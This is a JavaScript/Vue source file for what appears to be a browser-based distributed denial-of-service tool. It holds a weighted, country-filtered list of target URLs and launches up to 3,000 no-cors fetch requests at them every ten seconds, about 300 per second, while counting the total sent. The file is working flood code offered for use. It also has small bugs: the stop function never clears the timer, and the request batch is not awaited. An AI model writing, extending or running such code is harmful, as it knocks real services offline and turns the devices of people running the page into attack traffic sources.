import weightedRandom from 'weighted-random';
import { reactive } from 'vue';

let statusWorker = false;
const shootIntervalSeconds = 10;

export const state = reactive({
  totalRequests: 0,
  limitRequestsPerSecond: 300,
  country: 'UA',
  ipAddress: '0.0.0.0',
  tasks: [],
  weight: [],
  startWorker: undefined,
  changeLimit(value) {
    this.limitRequestsPerSecond = value;
  },
  setCountry(isoCode) {
    this.country = isoCode;
  },
  setIpAddress(ip) {
    this.ipAddress = ip;
  },
  setTasks(data) {
    this.tasks = data.filter((x) => {
      if (!x.enabled) {
        return false;
      }
      if (this.country === 'UA' && !x.uaAllowed) {
        return false;
      }
      return true;
    });
    this.weight = this.tasks.map((x) => x.weight || 0.5);
  },
});

async function fetchWithTimeout(resource) {
  const timeout = 8000;

  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  let response = undefined;
  try {
    response = await fetch(resource, {
      signal: controller.signal,
      mode: 'no-cors'
    });
  } catch {
    clearTimeout(id);
    return response;
  }
  clearTimeout(id);
  return response;
}

const createFetchesArray = () => {
  const fetchArray = [];
  for (let i = 1; i <= shootIntervalSeconds * state.limitRequestsPerSecond; i++) {
    const randomUrlIdx = weightedRandom(state.weight);
    const { url } = state.tasks[randomUrlIdx];
    fetchArray.push(fetchWithTimeout(url));
    state.totalRequests += 1;
  }

  return fetchArray;
};

const worker = async () => {
  if (!state.tasks.length) {
    statusWorker = false;
    return false;
  }
  state.startWorker = +new Date();
  state.totalRequests = 0;
  // eslint-disable-next-line
  setInterval(() => {
    const fetches = createFetchesArray();
    try {
      Promise.all(fetches);
    } catch {
      console.log('Somewhere has been rejected, current requests =>', state.totalRequests);
    }
  }, shootIntervalSeconds * 1000);
};

const startWorker = () => {
  if (!statusWorker) {
    statusWorker = true;
    worker();
  }
};

const stopWorker = () => {
  statusWorker = false;
};

export { startWorker, stopWorker };
export default worker;
